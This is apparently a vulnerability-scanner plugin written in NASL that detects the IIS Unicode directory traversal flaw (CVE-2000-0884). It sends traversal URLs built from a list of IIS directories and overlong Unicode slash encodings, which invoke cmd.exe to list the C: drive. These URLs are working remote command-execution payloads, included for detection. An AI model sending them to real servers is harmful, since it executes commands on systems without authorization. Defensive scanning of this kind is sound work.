if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10537" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_xref( name: "IAVA", value: "2000-a-0005" );
	script_bugtraq_id( 1806 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2000-0884" );
	script_name( "IIS directory traversal" );
	script_category( ACT_GATHER_INFO );
	script_copyright( "Copyright (C) 2001 H D Moore" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_mandatory_keys( "IIS/banner" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-078" );
	script_tag( name: "solution", value: "The vendor has releases updates. Please see the references for more information." );
	script_tag( name: "summary", value: "The remote IIS server allows anyone to execute arbitrary commands
  by adding a unicode representation for the slash character in the requested path." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "IIS" )){
	exit( 0 );
}
dir[0] = "/scripts/";
dir[1] = "/msadc/";
dir[2] = "/iisadmpwd/";
dir[3] = "/_vti_bin/";
dir[4] = "/_mem_bin/";
dir[5] = "/exchange/";
dir[6] = "/pbserver/";
dir[7] = "/rpc/";
dir[8] = "/cgi-bin/";
dir[9] = "/";
uni[0] = "%c0%af";
uni[1] = "%c0%9v";
uni[2] = "%c1%c1";
uni[3] = "%c0%qf";
uni[4] = "%c1%8s";
uni[5] = "%c1%9c";
uni[6] = "%c1%pc";
uni[7] = "%c1%1c";
uni[8] = "%c0%2f";
uni[9] = "%e0%80%af";
cmd = "/winnt/system32/cmd.exe?/c+dir+c:\\\\+/OG";
for(d = 0;dir[d];d++){
	for(u = 0;uni[u];u++){
		url = NASLString( dir[d], "..", uni[u], "..", uni[u], "..", uni[u], "..", uni[u], "..", uni[u], "..", cmd );
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(!res){
			continue;
		}
		if(( ContainsString( res, "<DIR>" ) ) || ( ContainsString( res, "Directory of C" ) )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

